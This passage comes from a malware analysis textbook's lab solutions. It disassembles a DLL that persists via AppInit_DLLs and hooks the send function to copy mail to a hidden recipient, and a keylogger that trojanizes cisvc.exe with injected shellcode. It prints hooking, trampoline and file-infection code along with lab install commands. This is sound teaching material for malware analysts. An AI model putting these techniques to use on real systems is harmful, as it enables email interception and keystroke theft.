    the argument hModule is set to 0 before the call to this function. Next, the malware
    returns the name in arg_4 (the string pointer passed to the function). This string
    is passed to two more functions, which parse the filename and change all of its
    characters to uppercase.'
  prefs: []
  type: TYPE_NORMAL
- en: '**1 1**'
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Malware that uses AppInit_DLLs as a persistence mechanism commonly uses* *GetModuleFileNameA.
    This malicious DLL is loaded into just about every process* *that starts on the
    system. Because malware authors may want to target only certain* *processes, they
    must determine the name of the process in which their malicious code is* *running.*'
  prefs: []
  type: TYPE_NORMAL
- en: Next, the current process name in uppercase letters is compared to the process
    names THEBAT.EXE, OUTLOOK.EXE, and MSIMN.EXE. If the string does not equal one
    of these filenames, the malware will exit. However, if the malware has been loaded
    into one of these three processes, the malicious code seen in Listing 11-10L will
    execute.
  prefs: []
  type: TYPE_NORMAL
- en: 10001561 call sub_100013BD 
  prefs: []
  type: TYPE_NORMAL
- en: 10001566 push offset dword_10003484 ; int
  prefs: []
  type: TYPE_NORMAL
- en: 1000156B push offset sub_1000113D
  prefs: []
  type: TYPE_NORMAL
- en: ; int
  prefs: []
  type: TYPE_NORMAL
- en: 10001570 push offset aSend ; "send"
  prefs: []
  type: TYPE_NORMAL
- en: 10001575 push offset aWsock32_dll ; "wsock32.dll"
  prefs: []
  type: TYPE_NORMAL
- en: 1000157A call sub_100012A3 
  prefs: []
  type: TYPE_NORMAL
- en: 1000157F add esp, 10h
  prefs: []
  type: TYPE_NORMAL
- en: 10001582 call sub_10001499 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-10L: Malicious code that sets an inline hook* Listing 11-10L has
    several functions for us to analyze. Inside , we see calls to GetCurrentProcessId
    and then sub_100012FE, which we rename to suspend_threads. The suspend_threads
    function calls GetCurrentThreadId, which returns a thread identifier (TID) of
    the current thread of execution. Next, suspend_threads calls CreateToolhelp32Snapshot
    and uses the result to loop Solutions to Labs'
  prefs: []
  type: TYPE_NORMAL
- en: '**575**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: through all of the TIDs for the current process. If a TID is not the current
    thread, then SuspendThread is called using the TID. We can conclude that the function
    called at  suspends all executing threads in the current process.
  prefs: []
  type: TYPE_NORMAL
- en: 'Conversely, the function called at  does the exact opposite: It resumes all
    of the threads using calls to ResumeThread. We conclude that the code in Listing
    11-10L is surrounded by two functions that suspend and then resume execution.
    This behavior is common when malware is making a change that could impact current
    execution, such as changing memory or installing an inline hook.'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we examine the code in the call at . The function sub_100012A3
  prefs: []
  type: TYPE_NORMAL
- en: takes four arguments, as shown by the series of pushes in Listing 11-10L.
  prefs: []
  type: TYPE_NORMAL
- en: Since this function is called only from this location, we can rename all of
    the arguments to match what is passed to the function, as shown in Listing 11-11L
  prefs: []
  type: TYPE_NORMAL
- en: beginning at .
  prefs: []
  type: TYPE_NORMAL
- en: 100012A3 sub_100012A3 proc near
  prefs: []
  type: TYPE_NORMAL
- en: 100012A3
  prefs: []
  type: TYPE_NORMAL
- en: 100012A3 lpAddress= dword ptr -8
  prefs: []
  type: TYPE_NORMAL
- en: 100012A3 hModule = dword ptr -4
  prefs: []
  type: TYPE_NORMAL
- en: 100012A3 wsock32_DLL= dword ptr 8 
  prefs: []
  type: TYPE_NORMAL
- en: 100012A3 send_function= dword ptr 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 100012A3 p_sub_1000113D= dword ptr 10h
  prefs: []
  type: TYPE_NORMAL
- en: 100012A3 p_dword_10003484= dword ptr 14h
  prefs: []
  type: TYPE_NORMAL
- en: 100012A3
  prefs: []
  type: TYPE_NORMAL
- en: 100012A3 push ebp
  prefs: []
  type: TYPE_NORMAL
- en: 100012A4 mov ebp, esp
  prefs: []
  type: TYPE_NORMAL
- en: 100012A6 sub esp, 8
  prefs: []
  type: TYPE_NORMAL
- en: 100012A9 mov eax, [ebp+wsock32_DLL]
  prefs: []
  type: TYPE_NORMAL
- en: 100012AC push eax ; lpModuleName 100012AD call ds:GetModuleHandleA 
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 100012CF mov edx, [ebp+send_function]
  prefs: []
  type: TYPE_NORMAL
- en: 100012D2 push edx ; lpProcName 100012D3 mov eax, [ebp+hModule]
  prefs: []
  type: TYPE_NORMAL
- en: 100012D6 push eax ; hModule 100012D7 call ds:GetProcAddress 
  prefs: []
  type: TYPE_NORMAL
- en: 100012DD mov [ebp+lpAddress], eax
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-11L: sub_100012A3 resolving the send function* In Listing 11-11L,
    we see a handle to *wsock32.dll* obtained using GetModuleHandleA at . That handle
    is passed to GetProcAddress to resolve the send function at . The malware ends
    up passing the address of the send function and the two other parameters (sub_1000113D
    and dword_10003484) to sub_10001203, which we renamed place_hook.'
  prefs: []
  type: TYPE_NORMAL
- en: Now, we examine place_hook and rename the arguments accordingly in order to
    aid our analysis. Listing 11-12L shows the start of place_hook.
  prefs: []
  type: TYPE_NORMAL
- en: '**576**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 10001209 mov eax, [ebp+_sub_1000113D]
  prefs: []
  type: TYPE_NORMAL
- en: 1000120C sub eax, [ebp+send_address]
  prefs: []
  type: TYPE_NORMAL
- en: 1000120F sub eax, 5
  prefs: []
  type: TYPE_NORMAL
- en: 10001212 mov [ebp+var_4], eax 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-12L: Address calculation for the jump instruction* The code in
    Listing 11-12L calculates the difference between the memory address of the send
    function and the start of sub_1000113D. This difference has an additional 5 bytes
    subtracted from it before being moved into var_4'
  prefs: []
  type: TYPE_NORMAL
- en: at . var_4 is used later in the code and prepended with 0xE9 (the opcode for
    jmp), making this a 5-byte instruction to jump to sub_1000113D.
  prefs: []
  type: TYPE_NORMAL
- en: Let’s see how the malware installs this code as a hook later in place_hook.
  prefs: []
  type: TYPE_NORMAL
- en: The start of the send function is modified by the instructions shown in Listing
    11-13L.
  prefs: []
  type: TYPE_NORMAL
- en: 10001271 mov edx, [ebp+send_address]
  prefs: []
  type: TYPE_NORMAL
- en: 10001274 mov byte ptr [edx], 0E9h 
  prefs: []
  type: TYPE_NORMAL
- en: 10001277 mov eax, [ebp+send_address]
  prefs: []
  type: TYPE_NORMAL
- en: 1000127A mov ecx, [ebp+var_4]
  prefs: []
  type: TYPE_NORMAL
- en: 1000127D mov [eax+1], ecx 
  prefs: []
  type: TYPE_NORMAL
- en: '**1 1**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-13L: The inline hook installation*'
  prefs: []
  type: TYPE_NORMAL
- en: At , the code copies the 0xE9 opcode into the start of the send function.
  prefs: []
  type: TYPE_NORMAL
- en: Following that, it copies var_4 into memory just after the 0xE9 at . Recall
    from Listing 11-12L that var_4 contains the destination of the jump, sub_1000113D.
  prefs: []
  type: TYPE_NORMAL
- en: The code in Listing 11-13L places a jmp instruction at the beginning of the
    send function that jumps to the function in our DLL at sub_1000113D, which we’ll
    now rename hook_function.
  prefs: []
  type: TYPE_NORMAL
- en: Before we examine hook_function, let’s wrap up our analysis of the inline hook
    installation. Listing 11-14L shows place_hook manipulating memory.
  prefs: []
  type: TYPE_NORMAL
- en: 10001218 push ecx ; lpflOldProtect 10001219 push PAGE_EXECUTE_READWRITE ; flNewProtect
    1000121B push 5 ; dwSize 1000121D mov edx, [ebp+send_address]
  prefs: []
  type: TYPE_NORMAL
- en: 10001220 push edx ; lpAddress 10001221 call ds:VirtualProtect 
  prefs: []
  type: TYPE_NORMAL
- en: 10001227 push 0FFh ; Size
  prefs: []
  type: TYPE_NORMAL
- en: 1000122C call malloc
  prefs: []
  type: TYPE_NORMAL
- en: 10001231 add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: 10001234 mov [ebp+var_8], eax 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-14L: place_hook (sub_10001203) manipulating memory* In Listing
    11-14L, place_hook calls VirtualProtect at  on the start of the send function
    code. This action changes the memory protection to execute, read, and write access,
    thereby allowing the malware to modify the instructions of the send function.
    Another call to VirtualProtect at the end of the Solutions to Labs'
  prefs: []
  type: TYPE_NORMAL
- en: '**577**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: function restores the original memory-protection settings. Then, immediately
    after calling VirtualProtect, the malware allocates 0xFF bytes of memory using
    malloc and stores the result in var_8 at . Because this dynamically allocated
    memory will play an important role in the installation of our hook as a trampoline,
    we’ll rename var_8 to trampoline.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*In order for this to execute properly, the memory returned by the call to
    malloc must be* *executable memory, which might not always be the case if, for
    example, Data Execution* *Prevention (DEP) is enabled via /Noexecute=alwayson
    or similar.*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-15L shows the creation of the trampoline’s code.
  prefs: []
  type: TYPE_NORMAL
- en: 10001246 push 5 ; Size
  prefs: []
  type: TYPE_NORMAL
- en: 10001248 mov eax, [ebp+send_address]
  prefs: []
  type: TYPE_NORMAL
- en: 1000124B push eax ; Src
  prefs: []
  type: TYPE_NORMAL
- en: 1000124C mov ecx, [ebp+trampoline]
  prefs: []
  type: TYPE_NORMAL
- en: 1000124F add ecx, 5
  prefs: []
  type: TYPE_NORMAL
- en: 10001252 push ecx ; Dst
  prefs: []
  type: TYPE_NORMAL
- en: 10001253 call memcpy 
  prefs: []
  type: TYPE_NORMAL
- en: 10001258 add esp, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 1000125B mov edx, [ebp+trampoline]
  prefs: []
  type: TYPE_NORMAL
- en: 1000125E mov byte ptr [edx+0Ah], 0E9h 
  prefs: []
  type: TYPE_NORMAL
- en: 10001262 mov eax, [ebp+send_address]
  prefs: []
  type: TYPE_NORMAL
- en: 10001265 sub eax, [ebp+trampoline]
  prefs: []
  type: TYPE_NORMAL
- en: 10001268 sub eax, 0Ah
  prefs: []
  type: TYPE_NORMAL
- en: 1000126B mov ecx, [ebp+trampoline]
  prefs: []
  type: TYPE_NORMAL
- en: 1000126E mov [ecx+0Bh], eax 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-15L: Trampoline creation for the inline hook* In Listing 11-15L,
    the memcpy at  copies the first 5 bytes of the send function into the trampoline.
    Since the malware overwrites the first 5 bytes of the send instruction (Listing
    11-13L), it needs to make sure that the original instructions are saved. The malware
    assumes that the send function’s first several instructions align exactly on 5
    bytes, which might not always be the case.'
  prefs: []
  type: TYPE_NORMAL
- en: Next, the malware adds a jmp instruction to the trampoline code at 
  prefs: []
  type: TYPE_NORMAL
- en: and . At , the 0xE9 opcode is added. At , the location to jump is added.
  prefs: []
  type: TYPE_NORMAL
- en: The jump location is calculated by subtracting the location of the trampoline
    from the location of the send function (meaning it will jump back to the send
    function).
  prefs: []
  type: TYPE_NORMAL
- en: Finally, place_hook ends by setting the global variable dword_10003484 to the
    trampoline location. We rename dword_10003484 to trampoline_function to aid analysis.
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we analyze hook_function (sub_1000113D), which will have the same arguments
    as the send function since it is installed as a hook. We begin our analysis by
    right-clicking the function name, selecting **Set Function Type**, and entering
    the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '**int __stdcall hook_function(SOCKET s, char * buf, int len, int flags)** **578**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'The hook function looks for the string RCPT TO: in buf. If the string isn’t
    found, the malware just calls trampoline_function, which causes send to operate
    as it did before the hook was installed. Otherwise, the code in Listing 11-16L'
  prefs: []
  type: TYPE_NORMAL
- en: will execute.
  prefs: []
  type: TYPE_NORMAL
- en: '1000116D push offset aRcptTo_1 ; "RCPT TO: <" '
  prefs: []
  type: TYPE_NORMAL
- en: 10001172 lea ecx, [ebp+Dst]
  prefs: []
  type: TYPE_NORMAL
- en: 10001178 push ecx ; Dst
  prefs: []
  type: TYPE_NORMAL
- en: 10001179 call memcpy
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 10001186 push offset email_address ; Src 
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 10001198 lea edx, [ebp+eax+Dst]
  prefs: []
  type: TYPE_NORMAL
- en: 1000119F push edx ; Dst
  prefs: []
  type: TYPE_NORMAL
- en: 100011A0 call memcpy
  prefs: []
  type: TYPE_NORMAL
- en: 100011A8 push offset Source ; ">\r\n" 
  prefs: []
  type: TYPE_NORMAL
- en: 100011AD lea eax, [ebp+Dst]
  prefs: []
  type: TYPE_NORMAL
- en: 100011B3 push eax ; Dest
  prefs: []
  type: TYPE_NORMAL
- en: 100011B4 call strcat
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-16L: Creating the string to add a recipient* **1 1**'
  prefs: []
  type: TYPE_NORMAL
- en: 'The code in Listing 11-16L builds a string that is added to the outgoing buffer.
    This string starts with RCPT TO: < at , followed by email_address at , and ends
    with >\r\n at . The email_address value in this case is *billy@*'
  prefs: []
  type: TYPE_NORMAL
- en: '*malwareanalysisbook.com* (extracted from *Lab11-02.ini*, as explained earlier
    when we looked at the contents of that file). This code adds a recipient to all
    outgoing email messages.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Low-Level Hook Operation Summary**'
  prefs: []
  type: TYPE_NORMAL
- en: 'Here’s a summary of the hook’s operation (also illustrated at a high-level
    in Figure 11-4L, shown earlier):'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: The program calls the send function.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: The first instruction of the send function transfers execution to sub_1000113D.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: sub_1000113D manipulates the outgoing buffer only if it contains a RCPT TO
  prefs: []
  type: TYPE_NORMAL
- en: string.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: sub_1000113D calls the trampoline code located on the heap and pointed to by
    dword_10003484\.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: The trampoline code executes the first three original instructions of the send
    function (which it overwrote to install the hook).
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: The trampoline code jumps back to the send function 5 bytes in, so that send
    can function normally.
  prefs: []
  type: TYPE_NORMAL
- en: '**Examining the Hook in OllyDbg**'
  prefs: []
  type: TYPE_NORMAL
- en: We can examine the inline hook using OllyDbg by installing the malware and then
    launching Outlook Express. (Outlook Express is bundled with Microsoft Windows
    XP and runs as *msimn.exe*.) We attach to the process using Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**579**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 128](index-613_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '**File****Attach** and selecting *msimn.exe* from the process listing. Attaching
    to a process immediately pauses all of the threads. If we examine the memory map,
    we see that *spoolvxx32.dll* is loaded in the process because it is an AppInit_DLLs
    value.'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we examine send by pressing CTRL-G and entering **send** in the text box.
    Figure 11-5L shows the start of the send function with the jmp hook to sub_1000113D.
    (If you like, you can set a breakpoint at this jump and analyze the code during
    runtime.)
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-5L: Examining the inline hook for the send* *function in* msimn.exe'
  prefs: []
  type: TYPE_NORMAL
- en: '**Capturing the Network Traffic**'
  prefs: []
  type: TYPE_NORMAL
- en: 'To capture this malware in action and see how it manipulates network traffic,
    set up a safe environment as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: Turn on host-only networking in your virtual machine.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: Install the malware on your virtual machine with the command **rundll32.exe
    Lab11-02.exe,installer**.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: Copy *Lab11-02.ini* into *C:\Windows\System32\*.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: Launch Wireshark and start capturing packets on the virtual machine network
    interface.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: Set up Outlook Express to send email to the host system.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: Run a fake mail server on your host machine with the command **python**
  prefs: []
  type: TYPE_NORMAL
- en: '**-m smtpd -n -c DebuggingServer *IP*****:25**, where *IP* is the IP address
    of the host machine.'
  prefs: []
  type: TYPE_NORMAL
- en: 7\.
  prefs: []
  type: TYPE_NORMAL
- en: Send an email from Outlook Express.
  prefs: []
  type: TYPE_NORMAL
- en: 8\.
  prefs: []
  type: TYPE_NORMAL
- en: Review the packet capture in Wireshark and select **Follow TCP Stream** on the
    email message.
  prefs: []
  type: TYPE_NORMAL
- en: '**Summary**'
  prefs: []
  type: TYPE_NORMAL
- en: Lab 11-2 is a malicious DLL that exports installer, which installs the malware
    persistently using AppInit_DLLs, causing the malware to be loaded into most processes.
    The malware checks to see if it is loaded into a mail client by using a preset
    list of process names to target. If the malware determines that it is running
    inside one of these processes, it will act as a user-mode rootkit by installing
    an inline hook for the send function. The hook takes the form of a jmp instruction
    placed at the beginning of the send function. The hook executes a function that
    scans every data buffer passed to the send function and **580**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: searches for RCPT TO. If the malware finds the RCPT TO string, it inserts an
    additional RCPT TO containing an email address retrieved by decoding *Lab11-02.ini*,
    essentially copying the malware author on every email sent from the targeted email
    programs.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 11-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Lab11-03.exe* contains the strings inet_epar32.dll and net start cisvc, which
    means that it probably starts the CiSvc indexing service. *Lab11-03.dll* contains
    the string C:\WINDOWS\System32\kernel64x.dll and imports the API calls GetAsyncKeyState
    and GetForegroundWindow, which makes us suspect it is a keylogger that logs to
    *kernel64x.dll*.'
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware starts by copying *Lab11-03.dll* to *inet_epar32.dll* in the Windows
    system directory. The malware writes data to *cisvc.exe* and starts the indexing
    service. The malware also appears to write keystrokes to *C:\* *Windows\System32\kernel64x.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware persistently installs *Lab11-03.dll* by trojanizing the indexing
    **1 1**
  prefs: []
  type: TYPE_NORMAL
- en: service by entry-point redirection. It redirects the entry point to run shellcode,
    which loads the DLL.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware infects *cisvc.exe* to load *inet_epar32.dll* and call its export
    zzz69806582\.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: '*Lab11-03.dll* is a polling keylogger implemented in its export zzz69806582\.'
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware stores keystrokes and the window into which keystrokes were entered
    to *C:\Windows\System32\kernel64x.dll*.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: We’ll begin our analysis by examining the strings and imports for *Lab11-03.exe*
    and *Lab11-03.dll*. *Lab11-03.exe* contains the strings inet_epar32.dll and net
    start cisvc. The net start command is used to start a service on a Windows machine,
    but we don’t yet know why the malware would be starting the indexing service on
    the system, so we’ll dig down during in-depth analysis.
  prefs: []
  type: TYPE_NORMAL
- en: '*Lab11-03.dll* contains the string C:\WINDOWS\System32\kernel64x.dll and imports
    the API calls GetAsyncKeyState and GetForegroundWindow, which makes us suspect
    it is a keylogger that logs keystrokes to *kernel64x.dll*. The DLL also contains
    an oddly named export: zzz69806582\.'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we use dynamic analysis techniques to see what the malware does at runtime.
    We set up procmon and filter on *Lab11-03.exe* to see the malware create *C:\Windows\System32\inet_epar32.dll*.
    The DLL *inet_epar32.dll* is identical to *Lab11-03.dll*, which tells us that
    the malware copies *Lab11-03.dll* to the Windows system directory.
  prefs: []
  type: TYPE_NORMAL
- en: Further in the procmon output, we see the malware open a handle to *cisvc.exe*,
    but we don’t see any WriteFile operations.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**581**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Finally, the malware starts the indexing service by issuing the command net
    start cisvc. Using Process Explorer, we see that *cisvc.exe* is now running on
    the system. Since we suspect that the malware might be logging keystrokes, we
    open *notepad.exe* and enter a bunch of *a* characters. We see that *kernel64x.dll*
    is created. Suspecting that keystrokes are logged, we open *kernel64x.dll* in
    a hex editor and see the following output:'
  prefs: []
  type: TYPE_NORMAL
- en: 'Untitled - Notepad: 0x41'
  prefs: []
  type: TYPE_NORMAL
- en: 'Untitled - Notepad: 0x41'
  prefs: []
  type: TYPE_NORMAL
- en: 'Untitled - Notepad: 0x41'
  prefs: []
  type: TYPE_NORMAL
- en: 'Untitled - Notepad: 0x41'
  prefs: []
  type: TYPE_NORMAL
- en: Our keystrokes have been logged to *kernel64x.dll*. We also see that the program
    in which we typed our keystrokes (Notepad) has been logged along with the keystroke
    data in hexadecimal. (The malware doesn’t turn the hexadecimal values into readable
    strings, so the malware author probably has a postprocessing script to more easily
    read what is entered.) Next, we use in-depth techniques to determine why the malware
    is starting a service and how the keylogger is gaining execution. We begin by
    loading *Lab11-03.exe* into IDA Pro and examining the main function, as shown
    in Listing 11-17L.
  prefs: []
  type: TYPE_NORMAL
- en: 004012DB push offset NewFileName ; "C:\\WINDOWS\\System32\\ inet_epar32.dll"
  prefs: []
  type: TYPE_NORMAL
- en: 004012E0 push offset ExistingFileName ; "Lab11-03.dll"
  prefs: []
  type: TYPE_NORMAL
- en: 004012E5 call ds:CopyFileA 
  prefs: []
  type: TYPE_NORMAL
- en: 004012EB push offset aCisvc_exe ; "cisvc.exe"
  prefs: []
  type: TYPE_NORMAL
- en: 004012F0 push offset Format ; "C:\\WINDOWS\\System32\\%s"
  prefs: []
  type: TYPE_NORMAL
- en: 004012F5 lea eax, [ebp+FileName]
  prefs: []
  type: TYPE_NORMAL
- en: 004012FB push eax ; Dest
  prefs: []
  type: TYPE_NORMAL
- en: 004012FC call _sprintf
  prefs: []
  type: TYPE_NORMAL
- en: 00401301 add esp, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 00401304 lea ecx, [ebp+FileName]
  prefs: []
  type: TYPE_NORMAL
- en: 0040130A push ecx ; lpFileName 0040130B call sub_401070 
  prefs: []
  type: TYPE_NORMAL
- en: 00401310 add esp, 4
  prefs: []
  type: TYPE_NORMAL
- en: 00401313 push offset aNetStartCisvc ; "net start cisvc" 
  prefs: []
  type: TYPE_NORMAL
- en: 00401318 call system
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-17L: Reviewing the main method of* Lab11-03.exe At , we see that
    the main method begins by copying *Lab11-03.dll* to *inet_epar32.dll* in *C:\Windows\System32*.
    Next, it builds the string C:\WINDOWS\ System32\cisvc.exe and passes it to sub_401070
    at . Finally, the malware starts the indexing service by using system to run
    the command net start cisvc at .'
  prefs: []
  type: TYPE_NORMAL
- en: We focus on sub_401070 to see what it might be doing with *cisvc.exe*. There
    is a lot of confusing code in sub_401070, so take a high-level look at this function
    using the cross-reference diagram shown in Figure 11-6L.
  prefs: []
  type: TYPE_NORMAL
- en: '**582**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 129](index-616_1.png)'
  prefs: []
  type: TYPE_IMG
- en: '*Figure 11-6L: Cross-reference graph for sub_401070*'
  prefs: []
  type: TYPE_NORMAL
- en: Using this diagram, we see that sub_401070 maps the *cisvc.exe* file into memory
    in order to manipulate it with calls to CreateFileA, CreateFileMappingA, and MapViewOfFile.
    All of these functions open the file for read and write access.
  prefs: []
  type: TYPE_NORMAL
- en: The starting address of the memory-mapped view returned by MapViewOfFile (labeled
    lpBaseAddress by IDA Pro) is both read and written to. Any changes made to this
    file will be written to disk after the call to UnmapViewOfFile, which explains
    why we didn’t see a WriteFile function in the procmon output.
  prefs: []
  type: TYPE_NORMAL
- en: Several calculations and checks appear to be made on the PE header of *cisvc.exe*.
    Rather than analyze these complex manipulations, let’s focus on the data written
    to the file, and then extract the version of *cisvc.exe* written to disk for analysis.
  prefs: []
  type: TYPE_NORMAL
- en: A buffer is written to the memory-mapped file, as shown in Listing 11-18L.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 1**'
  prefs: []
  type: TYPE_NORMAL
- en: 0040127C mov edi, [ebp+lpBaseAddress] 
  prefs: []
  type: TYPE_NORMAL
- en: 0040127F add edi, [ebp+var_28]
  prefs: []
  type: TYPE_NORMAL
- en: 00401282 mov ecx, 4Eh
  prefs: []
  type: TYPE_NORMAL
- en: 00401287 mov esi, offset byte_409030 
  prefs: []
  type: TYPE_NORMAL
- en: 0040128C rep movsd
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-18L: Writing 312 bytes of shellcode into* cisvc.exe At , the mapped
    location of the file is moved into EDI and adjusted by some offset using var_28\.
    Next, ECX is loaded with 0x4E, the number of DWORDs to write (movsd). Therefore,
    the total number of bytes is 0x4E * 4 = 312'
  prefs: []
  type: TYPE_NORMAL
- en: bytes in decimal. Finally, byte_409030 is moved into ESI at , and rep movsd
    copies the data at byte_409030 into the mapped file. We examine the data at 0x409030
    and see the bytes in the left side of Table 11-1L.
  prefs: []
  type: TYPE_NORMAL
- en: '**Table 11-1L:** The Shellcode Written to *cisvc.exe* **Raw bytes**'
  prefs: []
  type: TYPE_NORMAL
- en: '**Disassembly**'
  prefs: []
  type: TYPE_NORMAL
- en: 00409030 unk_409030 db 55h
  prefs: []
  type: TYPE_NORMAL
- en: 00409030 push ebp
  prefs: []
  type: TYPE_NORMAL
- en: 00409031 db 89h
  prefs: []
  type: TYPE_NORMAL
- en: 00409031 mov ebp, esp
  prefs: []
  type: TYPE_NORMAL
- en: 00409032 db 0E5h
  prefs: []
  type: TYPE_NORMAL
- en: 00409033 sub esp, 40h
  prefs: []
  type: TYPE_NORMAL
- en: 00409033 db 81h
  prefs: []
  type: TYPE_NORMAL
- en: 00409039 jmp loc_409134
  prefs: []
  type: TYPE_NORMAL
- en: 00409034 db 0ECh
  prefs: []
  type: TYPE_NORMAL
- en: 00409035 db 40h
  prefs: []
  type: TYPE_NORMAL
- en: The left side of the table contains raw bytes, but if we put the cursor at 0x409030
    and press C in IDA Pro, we get the disassembly shown in the right side of the
    table. This is shellcode—handcrafted assembly that, in this case, is Solutions
    to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**583**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 130](index-617_1.png)'
  prefs: []
  type: TYPE_IMG
- en: used for process injection. Rather than analyze the shellcode (doing so can
    be a bit complicated and messy), we’ll guess at what it does based on the strings
    it contains.
  prefs: []
  type: TYPE_NORMAL
- en: 'Toward the end of the 312 bytes of shellcode, we see two strings: 00409139
    aCWindowsSystem db ''C:\WINDOWS\System32\inet_epar32.dll'',0'
  prefs: []
  type: TYPE_NORMAL
- en: 0040915D aZzz69806582 db 'zzz69806582',0
  prefs: []
  type: TYPE_NORMAL
- en: The appearance of the path to *inet_epar32.dll* and the export zzz69806582
  prefs: []
  type: TYPE_NORMAL
- en: suggest that this shellcode loads the DLL and calls its export.
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we compare the *cisvc.exe* binary as it exists after we run the malware
    to a clean version that existed before the malware was run. (Most hex editors
    provide a comparison tool.) Comparing the versions, we see two differences: the
    insertion of 312 bytes of shellcode and only a 2-byte change in the PE'
  prefs: []
  type: TYPE_NORMAL
- en: header. We load both of these binaries into PEview to see if we notice a difference
    in the PE header. This comparison is shown in Figure 11-7L.
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-7L: PEview of original and trojanized versions of* cisvc.exe The
